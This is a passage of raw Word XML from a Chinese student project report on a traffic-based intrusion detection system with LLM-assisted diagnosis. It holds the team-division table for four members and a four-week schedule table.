          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2.3 小组分工</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E571ADF">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>四名成员按“链路位置”分工，而不是按“写文档 / 写代码”分工：每人负责的模块都在同一条数据通路上，改动自己的模块时能直接看到下游反应。需要说明的是，仓库 README 里早期按两人（同学 A / 同学 B）预留的模块归属是立项时的草案，四人组队后按下表细化落实。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8E2807">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 2-2　小组分工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737"/>
        <w:gridCol w:w="1587"/>
        <w:gridCol w:w="5272"/>
      </w:tblGrid>
      <w:tr w14:paraId="7F12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DEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2498B14B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>姓名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="737" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5947ED69">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>角色</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7ACE1E74">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>承担模块</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5272" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7249F8E6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>主要工作内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="2F48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63CADEA4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>姚霖锋</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="737" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1F37F352">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>组长</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0B34C6CB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M1、M6、M7、M10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5272" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7509217F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>负责总体方案、模块划分与进度把控；基于 scapy 实现抓包与协议解析、双向会话表与 pcap 落盘；实现 FastAPI 中心服务、Token 鉴权、SQLite 存储与告警分级；编写三支攻击复现脚本并加安全护栏；负责整体集成联调（中心 + 看板 + 大模型 + 回放脚本）与答辩材料汇总。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="53F9A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5F79158D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>孙贤泽</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="737" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="38A9530E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>组员</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4A656BE7">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M2、M3、M8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5272" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4564A053">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>实现 78 维 CICFlowMeter 口径特征提取，负责在线提取器与数据集的三处口径对齐（包长、标志位、聚合形态）并补回归测试；封装模型训练与在线推理；设计并执行五模型同口径对比实验，确定“随机划分 → 类内按时间 → 前向滚动验证”的选型口径演进与最终选型。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="5B5A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020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3F9F66D4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>潘凤乐</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="737" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18C43DA9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>组员</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2DFC57D4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M4、M9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5272" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="57815119">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>设计诊断提示词（含三条铁律：不许改判、只许引用给定证据、必须回到协议层）与五段式输出 schema；构建 12 条协议知识并用字符二元组 BM25 实现检索；实现多轮追问链路；实现大模型不可用时的模板降级路径；负责数据集抽样脚本，并核对每份报告的字段完整性。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0CEC2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69A8E441">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>王储</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="737" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1DC6564D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>组员</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1F32F1D2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>M5、M11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5272" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1E054DB4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>实现 Streamlit 看板的四个标签页、图表与自动刷新机制，处理规则告警“超阈值倍数”与小模型置信度的展示差异；实现阈值规则引擎（单流规则 + 窗口规则 + 按域去重）与规则基线评测脚本；负责 59 条单元测试。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="63A403AD">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EFCDE7C">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>为保证分工在文档里可追溯，第三章按人分四节，每节先讲本人负责模块的设计与实测结果，再把本人编写的源文件**完整**列出（不是节选）。任何一个数字、任何一段代码，都能对应到具体的人与具体的文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AD981D">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2.4 进度安排</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01202F4F">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 2-3　进度安排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361"/>
        <w:gridCol w:w="3969"/>
        <w:gridCol w:w="2154"/>
      </w:tblGrid>
      <w:tr w14:paraId="2F11A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shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7230B138">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>周次</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4E749731">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>时间</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3969" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6FE65B52">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>主要工作</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2154" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="104F39F4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>交付物</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="2557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3B2CDDB0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>第 1 周</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="61CFD544">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>第 1—7 天</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3969" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6B8E6237">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>选题论证、方案设计、数据集下载与抽样、开发环境搭建</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2154" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="49FDA09D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>任务书草案、数据样本与清单</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="676F5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2DB605DB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>第 2 周</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2AB5A8FA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>第 8—14 天</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3969" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1FEBCF26">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>打通最小链路：抓包 → 特征 → 上报 → 中心落库 → 判定</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2154" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1FE53F52">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>可运行的探针与中心服务</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0DD3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134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0295183F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>第 3 周</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="429BE0D8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>第 15—21 天</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3969" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5EA4C718">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>接入大模型与知识库、实现看板、实现规则引擎</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2154" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4D951AC5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>可演示的四层系统、规则基线数字</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="4D95F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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="657E7472">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>第 4 周</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="61D897C9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>第 22—28 天</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3969" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="212651C5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>五模型对比与选型、端到端联调、单元测试、报告撰写</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2154" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74A1BDD2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>本报告、截图证据、答辩材料</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5973EE52">
      <w:pPr>
